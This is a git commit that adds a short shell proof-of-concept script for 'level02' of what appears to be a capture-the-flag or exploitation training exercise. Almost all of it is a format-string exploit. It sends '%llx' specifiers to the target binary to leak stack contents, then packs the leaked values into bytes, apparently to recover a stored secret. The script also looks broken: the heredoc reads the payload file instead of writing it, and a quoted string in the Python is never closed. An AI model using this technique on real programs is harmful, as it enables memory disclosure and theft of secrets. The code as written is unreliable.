3e01dd71fe71a606f2ddb071300816216e2b4089
BetterCallMolly <molly@mana.rip>
2023-11-19 16:20:36 +0100

    add: AIO poc script for `level02`

---
+++ level02/Ressources/poc.sh
@@ -0,0 +1,21 @@
+#!/bin/sh
+
+cat /tmp/payload.02 << EOF
+%22\$llx %23\$llx %24\$llx %25\$llx %26\$llx'
+a
+
+EOF
+
+ADDRESSES=`cat /tmp/payload.02 | ./level02 | grep ' does not have access!' | sed 's/ does not have access!//g'`
+
+python << EOF
+import struct
+data = '$ADDRESSES
+xs = [int(x, 16) for x in data.split(' ')]
+output = ""
+for x in xs:
+    output += struct.pack("<Q", x) # little endian
+
+print output
+
+EOF
